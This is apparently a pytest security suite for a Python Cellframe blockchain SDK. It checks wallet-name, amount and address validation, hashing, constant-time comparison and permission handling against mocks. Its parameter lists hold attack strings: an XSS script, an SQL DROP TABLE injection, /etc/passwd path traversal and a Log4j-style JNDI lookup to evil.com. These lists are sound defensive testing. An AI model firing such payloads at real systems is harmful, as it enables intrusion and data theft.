"""
🔒 Security Tests for Python Cellframe SDK
Testing security aspects, input validation, and potential vulnerabilities.
"""

import pytest
import hashlib
import secrets
import time
from unittest.mock import Mock, patch
from decimal import Decimal

# Import the classes under test
try:
    from CellFrame.core import CellframeNode
    from CellFrame.chain import Wallet, TX, WalletType
    from CellFrame.core.context import LibContext
    from CellFrame.core.exceptions import CellframeException
except ImportError as e:
    pytest.skip(f"CellFrame modules not available: {e}", allow_module_level=True)


class TestInputValidationSecurity:
    """Security tests for input validation."""
    
    def setup_method(self):
        """Setup for each test method."""
        self.mock_context = Mock(spec=LibContext)
        self.mock_context.is_plugin_mode = False
        self.mock_context.is_library_mode = True
        self.mock_context.app_name = "security_test"
        self.mock_context.initialize.return_value = True
        
    @pytest.mark.security
    @pytest.mark.parametrize("malicious_input", [
        "<script>alert('xss')</script>",
        "'; DROP TABLE wallets; --",
        "../../../etc/passwd",
        "\\x00\\x01\\x02",
        "A" * 10000,  # Very long input
        "\n\r\t\0",  # Control characters
        "../../config.json",
        "${jndi:ldap://evil.com/}",  # Log4j style injection
    ])
    @patch('CellFrame.chain.create_wallet')
    def test_wallet_name_injection_protection(self, mock_create, malicious_input):
        """Test protection against injection attacks in wallet names."""
        def secure_create_wallet(name, *args):
            # Security validation
            if not isinstance(name, str):
                raise ValueError("Wallet name must be string")
            
            # Length validation
            if len(name) > 255:
                raise ValueError("Wallet name too long")
            
            # Character validation
            forbidden_chars = ['<', '>', '&', '"', "'", '\\', '/', '\0', '\n', '\r']
            if any(char in name for char in forbidden_chars):
                raise ValueError("Invalid characters in wallet name")
            
            # Path traversal protection
            if '..' in name or name.startswith('/'):
                raise ValueError("Path traversal attempt detected")
            
            wallet = Mock(spec=Wallet)
            wallet.name = name
            return wallet
        
        mock_create.side_effect = secure_create_wallet
        
        node = CellframeNode(context=self.mock_context)
        
        # Should reject malicious input
        with pytest.raises(ValueError, match="Invalid characters|too long|Path traversal"):
            node.chain.create_wallet(malicious_input)
            
    @pytest.mark.security
    @pytest.mark.parametrize("invalid_amount", [
        Decimal("-100"),  # Negative amount
        Decimal("0"),     # Zero amount
        Decimal("1e+50"), # Extremely large amount
        float('inf'),     # Infinity
        float('nan'),     # NaN
        "not_a_number",   # String instead of number
        None,             # None value
    ])
    def test_transaction_amount_validation_security(self, invalid_amount):
        """Test security validation for transaction amounts."""
        def validate_amount(amount):
            # Security validations for amounts
            if amount is None:
                raise ValueError("Amount cannot be None")
            
            if isinstance(amount, str):
                raise ValueError("Amount must be numeric")
            
            if isinstance(amount, float):
                if amount != amount:  # NaN check
                    raise ValueError("Amount cannot be NaN")
                if amount == float('inf') or amount == float('-inf'):
                    raise ValueError("Amount cannot be infinite")
            
            if isinstance(amount, (int, float, Decimal)):
                amount = Decimal(str(amount))
                
                if amount <= 0:
                    raise ValueError("Amount must be positive")
                    
                # Reasonable maximum
                if amount > Decimal("1e18"):
                    raise ValueError("Amount too large")
            
            return True
        
        # Should reject invalid amounts
        with pytest.raises((ValueError, TypeError, OverflowError)):
            validate_amount(invalid_amount)
            
    @pytest.mark.security
    @pytest.mark.parametrize("malicious_address", [
        "",  # Empty address
        "x" * 1000,  # Very long address
        "addr\x00null",  # Null byte injection
        "javascript:alert(1)",  # JavaScript URL
        "http://evil.com/steal",  # External URL
        "../../../private_key",  # Path traversal
        "0x" + "F" * 100,  # Invalid hex
    ])
    def test_address_validation_security(self, malicious_address):
        """Test security validation for addresses."""
        def validate_address(address):
            if not isinstance(address, str):
                raise ValueError("Address must be string")
            
            if len(address) < 5 or len(address) > 255:
                raise ValueError("Invalid address length")
            
            # No null bytes or control characters
            if any(ord(c) < 32 for c in address):
                raise ValueError("Invalid control characters")
            
            # No URL schemes
            url_schemes = ['http://', 'https://', 'javascript:', 'data:', 'ftp://']
            if any(address.lower().startswith(scheme) for scheme in url_schemes):
                raise ValueError("URL schemes not allowed")
            
            # No path traversal
            if '..' in address or '/' in address:
                raise ValueError("Path characters not allowed")
            
            return True
        
        # Should reject malicious addresses
        with pytest.raises(ValueError):
            validate_address(malicious_address)


class TestCryptographicSecurity:
    """Security tests for cryptographic operations."""
    
    def setup_method(self):
        """Setup for each test method."""
        self.mock_context = Mock(spec=LibContext)
        self.mock_context.is_plugin_mode = False
        self.mock_context.is_library_mode = True
        self.mock_context.initialize.return_value = True
        
    @pytest.mark.security
    def test_random_number_generation_security(self):
        """Test cryptographic random number generation."""
        # Generate multiple random values
        random_values = [secrets.randbits(256) for _ in range(100)]
        
        # Check uniqueness (should have no duplicates)
        assert len(set(random_values)) == len(random_values)
        
        # Check range (should use full bit range)
        max_value = 2**256 - 1
        assert any(val > max_value * 0.5 for val in random_values)
        assert any(val < max_value * 0.5 for val in random_values)
        
    @pytest.mark.security
    def test_hash_function_security(self):
        """Test hash function security properties."""
        test_data = b"test_transaction_data"
        
        # Test deterministic hashing
        hash1 = hashlib.sha256(test_data).hexdigest()
        hash2 = hashlib.sha256(test_data).hexdigest()
        assert hash1 == hash2
        
        # Test avalanche effect (small change = big difference)
        similar_data = b"test_transaction_datA"  # Changed one bit
        hash3 = hashlib.sha256(similar_data).hexdigest()
        
        # Hashes should be completely different
        different_bits = sum(a != b for a, b in zip(hash1, hash3))
        assert different_bits > len(hash1) * 0.4  # At least 40% different
        
    @pytest.mark.security
    @patch('CellFrame.chain.create_wallet')
    def test_private_key_protection(self, mock_create):
        """Test private key protection mechanisms."""
        class SecureWallet:
            def __init__(self, name):
                self.name = name
                self._private_key = secrets.token_bytes(32)  # Secure random key
                
            def get_private_key(self):
                # Should never expose raw private key
                raise AttributeError("Private key access not allowed")
                
            def sign_data(self, data):
                # Should only allow signing, not key access
                return f"signature_of_{hashlib.sha256(data).hexdigest()}"
                
            def get_address(self):
                # Derive address from private key without exposing key
                return f"addr_{hashlib.sha256(self._private_key).hexdigest()[:40]}"
        
        mock_create.side_effect = lambda name, *args: SecureWallet(name)
        
        node = CellframeNode(context=self.mock_context)
        wallet = node.chain.create_wallet("secure_wallet")
        
        # Should be able to get address
        address = wallet.get_address()
        assert address.startswith("addr_")
        
        # Should be able to sign data
        signature = wallet.sign_data(b"test_data")
        assert signature.startswith("signature_of_")
        
        # Should NOT be able to access private key
        with pytest.raises(AttributeError):
            wallet.get_private_key()
            
    @pytest.mark.security
    def test_signature_verification_security(self):
        """Test signature verification security."""
        def verify_signature(data, signature, public_key):
            # Simulate secure signature verification
            
            # Check inputs are not None
            if not all([data, signature, public_key]):
                return False
            
            # Simulate time-constant comparison to prevent timing attacks
            expected_sig = f"valid_sig_{hashlib.sha256(data).hexdigest()}"
            
            # Time-constant comparison
            if len(signature) != len(expected_sig):
                return False
            
            result = 0
            for a, b in zip(signature, expected_sig):
                result |= ord(a) ^ ord(b)
            
            return result == 0
        
        test_data = b"test_message"
        valid_signature = f"valid_sig_{hashlib.sha256(test_data).hexdigest()}"
        invalid_signature = "invalid_signature"
        public_key = "test_public_key"
        
        # Valid signature should verify
        assert verify_signature(test_data, valid_signature, public_key) is True
        
        # Invalid signature should fail
        assert verify_signature(test_data, invalid_signature, public_key) is False
        
        # None inputs should fail
        assert verify_signature(None, valid_signature, public_key) is False
        assert verify_signature(test_data, None, public_key) is False
        assert verify_signature(test_data, valid_signature, None) is False


class TestTimingAttackPrevention:
    """Security tests for timing attack prevention."""
    
    @pytest.mark.security
    def test_constant_time_comparison(self):
        """Test timing attack prevention in comparisons."""
        def secure_compare(a, b):
            """Constant-time string comparison."""
            if len(a) != len(b):
                return False
            
            result = 0
            for x, y in zip(a, b):
                result |= ord(x) ^ ord(y)
            
            return result == 0
        
        # Test with equal length strings
        secret = "secret_api_key_123456"
        correct_guess = "secret_api_key_123456"
        wrong_guess = "secret_api_key_123457"  # One char different
        
        # Measure timing for correct and incorrect guesses
        times_correct = []
        times_wrong = []
        
        for _ in range(100):
            # Correct guess timing
            start = time.perf_counter()
            result1 = secure_compare(secret, correct_guess)
            end = time.perf_counter()
            times_correct.append(end - start)
            assert result1 is True
            
            # Wrong guess timing
            start = time.perf_counter()
            result2 = secure_compare(secret, wrong_guess)
            end = time.perf_counter()
            times_wrong.append(end - start)
            assert result2 is False
        
        # Timing should be similar (within reasonable variance)
        avg_correct = sum(times_correct) / len(times_correct)
        avg_wrong = sum(times_wrong) / len(times_wrong)
        
        # Times should not differ by more than 50%
        time_ratio = abs(avg_correct - avg_wrong) / max(avg_correct, avg_wrong)
        assert time_ratio < 0.5, f"Timing difference too large: {time_ratio}"
        
    @pytest.mark.security
    def test_rate_limiting_timing(self):
        """Test rate limiting doesn't leak timing information."""
        class RateLimiter:
            def __init__(self):
                self.attempts = {}
                self.max_attempts = 3
                
            def check_rate_limit(self, identifier):
                current_attempts = self.attempts.get(identifier, 0)
                
                # Always do the same amount of work regardless of attempt count
                for _ in range(10):  # Constant work
                    hash(f"{identifier}_{current_attempts}")
                
                if current_attempts >= self.max_attempts:
                    return False
                
                self.attempts[identifier] = current_attempts + 1
                return True
        
        limiter = RateLimiter()
        
        # Test timing consistency
        times = []
        for i in range(10):
            start = time.perf_counter()
            result = limiter.check_rate_limit("test_user")
            end = time.perf_counter()
            times.append(end - start)
        
        # Timing should be relatively consistent
        avg_time = sum(times) / len(times)
        max_deviation = max(abs(t - avg_time) for t in times)
        
        # Deviation should be small relative to average time
        assert max_deviation < avg_time * 2, "Timing inconsistency detected"


class TestMemorySecurityLeaks:
    """Security tests for memory leaks and sensitive data exposure."""
    
    def setup_method(self):
        """Setup for each test method."""
        self.mock_context = Mock(spec=LibContext)
        self.mock_context.is_plugin_mode = False
        self.mock_context.is_library_mode = True
        self.mock_context.initialize.return_value = True
        
    @pytest.mark.security
    def test_sensitive_data_cleanup(self):
        """Test that sensitive data is properly cleaned up."""
        import gc
        import weakref
        
        # Create object with sensitive data
        class SensitiveWallet:
            def __init__(self):
                self.private_key = "very_secret_private_key_data"
                self.passphrase = "super_secret_passphrase"
                
            def __del__(self):
                # Secure cleanup
                if hasattr(self, 'private_key'):
                    self.private_key = "0" * len(self.private_key)
                if hasattr(self, 'passphrase'):
                    self.passphrase = "0" * len(self.passphrase)
        
        # Create and track wallet
        wallet = SensitiveWallet()
        weak_ref = weakref.ref(wallet)
        
        # Verify object exists
        assert weak_ref() is not None
        
        # Delete reference
        del wallet
        gc.collect()
        
        # Object should be garbage collected
        # Note: This might not always work in tests due to reference counting
        # but it demonstrates the pattern
        
    @pytest.mark.security 
    def test_no_sensitive_data_in_error_messages(self):
        """Test that error messages don't leak sensitive data."""
        def secure_wallet_operation(private_key, amount):
            try:
                if not private_key:
                    raise ValueError("Invalid private key")
                
                if amount <= 0:
                    raise ValueError("Invalid amount")
                    
                # Simulate operation that might fail
                raise RuntimeError("Network connection failed")
                
            except Exception as e:
                # Error message should not contain sensitive data
                error_msg = str(e)
                
                # Check that private key is not in error message
                if private_key and private_key in error_msg:
                    raise SecurityError("Private key leaked in error message")
                
                raise e
        
        class SecurityError(Exception):
            pass
        
        # Test with sensitive data
        sensitive_key = "very_secret_private_key_12345"
        
        # Should raise the original error, not SecurityError
        with pytest.raises(RuntimeError, match="Network connection failed"):
            secure_wallet_operation(sensitive_key, 100)
        
        # Should not leak private key in any error
        with pytest.raises((ValueError, SecurityError)) as exc_info:
            try:
                secure_wallet_operation(sensitive_key, -100)
            except Exception as e:
                if sensitive_key in str(e):
                    raise SecurityError("Private key leaked")
                raise
        
        # Ensure it's not a SecurityError (meaning no leak)
        assert not isinstance(exc_info.value, SecurityError)


class TestAccessControlSecurity:
    """Security tests for access control and authorization."""
    
    @pytest.mark.security
    def test_unauthorized_operation_prevention(self):
        """Test prevention of unauthorized operations."""
        class SecureNode:
            def __init__(self):
                self._authorized = False
                self._permissions = set()
                
            def authenticate(self, token):
                # Simulate authentication
                if token == "valid_auth_token":
                    self._authorized = True
                    self._permissions = {"read", "write", "admin"}
                    return True
                return False
                
            def require_permission(self, permission):
                if not self._authorized:
                    raise PermissionError("Not authenticated")
                if permission not in self._permissions:
                    raise PermissionError(f"Permission '{permission}' required")
                
            def read_wallet(self):
                self.require_permission("read")
                return "wallet_data"
                
            def create_wallet(self):
                self.require_permission("write")
                return "new_wallet"
                
            def delete_all_wallets(self):
                self.require_permission("admin")
                return "deleted"
        
        node = SecureNode()
        
        # Unauthenticated operations should fail
        with pytest.raises(PermissionError, match="Not authenticated"):
            node.read_wallet()
            
        with pytest.raises(PermissionError, match="Not authenticated"):
            node.create_wallet()
            
        # Authenticate
        assert node.authenticate("valid_auth_token") is True
        
        # Authenticated operations should work
        assert node.read_wallet() == "wallet_data"
        assert node.create_wallet() == "new_wallet"
        assert node.delete_all_wallets() == "deleted"
        
        # Invalid authentication should fail
        node._authorized = False
        assert node.authenticate("invalid_token") is False
        
        with pytest.raises(PermissionError):
            node.read_wallet()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])